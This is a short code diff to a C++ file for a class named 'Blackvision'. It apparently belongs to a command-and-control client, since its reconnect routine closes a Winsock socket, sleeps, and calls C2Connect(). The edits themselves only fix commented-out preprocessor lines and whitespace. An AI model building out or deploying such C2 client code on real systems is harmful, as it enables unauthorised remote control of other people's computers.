@@ -1,12 +1,12 @@
-//include "pch.h"
+//#include "pch.h"
 #include "blackvision.h"
-//pragma warning (disable : 4996) 
+//#pragma warning (disable : 4996) 
 
 void Blackvision::reconnect()
 {
 	closesocket(sockfd);
 	WSACleanup();
-	Sleep(INTERVAL); 
+	Sleep(INTERVAL);
 	C2Connect();
 }
 void Blackvision::startup()
